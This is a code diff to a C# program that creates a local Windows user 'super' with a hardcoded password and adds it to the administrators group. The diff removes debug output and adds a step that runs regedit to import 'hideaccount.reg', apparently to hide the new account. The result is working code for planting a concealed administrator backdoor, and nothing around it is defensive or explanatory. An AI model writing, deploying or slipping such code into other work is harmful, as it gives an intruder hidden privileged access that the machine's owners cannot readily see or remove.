@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Text;
 using System.DirectoryServices;
+using System.Diagnostics;
 
 namespace CreateUser
 {
@@ -22,8 +23,8 @@ namespace CreateUser
                     user.CommitChanges();//保存用户
                     using (DirectoryEntry grp = dir.Children.Find(group, "group"))
                     {
-                        Console.WriteLine(grp);
-                        Console.ReadKey();
+                        
+                        
                         if (grp.Name != "")
                         {
                             grp.Invoke("Add", user.Path.ToString());//将用户添加到某组
@@ -40,6 +41,9 @@ namespace CreateUser
         static void Main(string[] args)
         {
             AddUser("super","qwer.1234","administrators","root");
+            Process regeditProcess = Process.Start("regedit.exe", "hideaccount.reg");//导入注册表
+           
+            
         }
     }
 }
